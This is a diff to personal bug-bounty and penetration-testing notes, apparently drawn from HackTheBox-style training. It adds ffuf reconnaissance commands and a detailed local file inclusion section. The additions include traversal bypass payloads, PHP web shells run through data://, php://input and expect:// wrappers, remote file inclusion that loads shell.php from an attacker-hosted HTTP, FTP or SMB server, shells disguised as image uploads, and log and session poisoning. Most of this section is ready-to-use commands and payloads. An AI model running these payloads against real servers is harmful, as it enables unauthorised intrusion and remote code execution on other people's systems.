@@ -1,3 +1,25 @@
+Structure of Saving Bug bounty program:
+-----------------------------------------
+Projects/
+└── Acme Company
+    ├── EPT
+    │   ├── evidence
+    │   │   ├── credentials
+    │   │   ├── data
+    │   │   └── screenshots
+    │   ├── logs
+    │   ├── scans
+    │   ├── scope
+    │   └── tools
+    └── IPT
+        ├── evidence
+        │   ├── credentials
+        │   ├── data
+        │   └── screenshots
+        ├── logs
+        ├── scans
+        ├── scope
+        └── tools
 Bug bounty private Programs dorks
 ------------------------------------
 	"responsible disclosure program"
@@ -14,10 +36,17 @@ Subdomain finder
 	amass (kali tool),sublist3r, assetfinder
 	
 	assetfinder -subs-only domain.com > asset.txt
+	
 	sublist3r -d domain.com -o subdomain.txt 
+	
 	virus total - curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=company.com&apikey=key" | jq -r '.domain_siblings[]'
-	ffuf -w brue_subdomains.txt -u http://FUZZ.target.com -H "Host: FUZZ.target.com" -mc 200-204,400-405,500
+	
+	ffuf -w subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/
+	
+	For VHOST - ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://target.com/ -H 'Host: FUZZ.target.com' (you can also use -mc 200-204,400-405,500)
+	
 	python3 subbrute.py domain.com
+	
 	Remove Duplecates URLs - cat asset.txt | urldedupe > assets.txt
 	---------------------------------
 Check if the target is using IIS server:
@@ -94,6 +123,17 @@ Use meg for dirsearch also
 One line command for urls:
 	dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output_imp.txt
 	https://github.com/random-robbie/bruteforce-lists/blob/master/aspx.txt 
+	
+	ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://ip:port/FUZZ
+	ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://ip:port/blog/FUZZ.php
+	
+	If the application is stable you can use recursive:
+	ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
+	
+Find Parameter:
+----------------
+Once you find the extention file (mostly .aspx and .php) go for the paramerer fuzzing with -
+Find the parameter: ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
 ------------------------------
 Email Spoofing:
 --------------------
@@ -556,7 +596,106 @@ Web socket:
 	Test2- Test CSWH(Cross Site WebSocket Hijacking) use this site-https://www.fco.com/websocket-tester or we can use tool "websocat". After connetcting to the websocket try to xss, sql, modify the header and other stuf.
 	Test3- If Sec-Websocket-key is not used check for csrf
 
-LFI to RCE - https://aditya-chauhan17.medium.com/local-file-inclusion-lfi-to-rce-7594e15870e1 
+LFI:
+-------------
+Find the parameter: ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+Automated LFI:ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
+LFI to Common file enumuration:
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+LFI Bypass:
+----------
+....////etc/passwd
+
+with url encoding (%2e%2e%2f)
+
+Approved Paths ( if the path is index.php?page=pages/2 then pages/../../../../etc/passwd)
+
+Appended Extension: http://<SERVER_IP>:<PORT>/index.php?page=php://filter/read=convert.base64-encode/resource=existing_file_inthe_dir  (not inclue the extention like .php you can try index.php)
+
+LFI to RCE:
+-------------
+1. PHP Wrappers:
+
+	Check - curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/apache2/php.ini"  (X.Y is the version)
+
+	Check the allow_url_include enabled or not;(after decode from base64)
+
+	echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+	Vulnerable if ; allow_url_include = On
+
+	Encode the payload:
+	echo '<?php system($_GET["cmd"]); ?>' | base64
+
+	Execute the command:
+	curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,base64_data&cmd=id' | grep uid 
+	(if need use base64 with url encode)
+
+	or
+
+	curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+
+	You can also check for extension=expect if allow_url_include = Off:
+	echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+
+	Vulnerable if ; extension=expect
+
+	Execute the cmd:
+	curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
+
+2. Using RFI:
+
+	Check for allow_url_include
+	vulnerable if allow_url_include = On
+	Checking for internal files; http://127.0.0.1:80/index.php
+	Create a shell;
+	echo '<?php system($_GET["cmd"]); ?>' > shell.php
+	host http server:
+	sudo python3 -m http.server <LISTENING_PORT> (you can create ftp or smb server also - <ftp - sudo python -m pyftpdlib -p 21><smb- impacket-smbserver -smb2support share $(pwd)>)
+	Then you can use;
+	http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+
+	If using ftp - http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+
+3. Using File upload:
+
+	Upload the file and navigate exete the shell;
+	echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+	or 
+
+	echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+
+4. Using Log Posioning:
+
+	By default, Apache logs are located in /var/log/apache2/access.log on Linux and in C:\xampp\apache\logs\access.log on Windows, while Nginx logs are located in /var/log/nginx/error.log on Linux and in C:\nginx\log\error.log
+
+	Access the log using lfi:
+	http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
+
+	on the burp suite Change the host header request to anything and send it to server then check the server logs, if you got anything as in log you can proced.
+
+	Execute it:
+	TheVillain7@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+	TheVillain7@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+
+	then in the burp;
+	http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
+
+5. Using session posioning (applicable in php):
+
+	just hit:
+	/var/lib/php/sessions/sess_yourphpsession
+
+	then 
+	http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+	then http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_yourphpsession&cmd=id
+	
+https://aditya-chauhan17.medium.com/local-file-inclusion-lfi-to-rce-7594e15870e1 
 
 
 CRLF Injection:
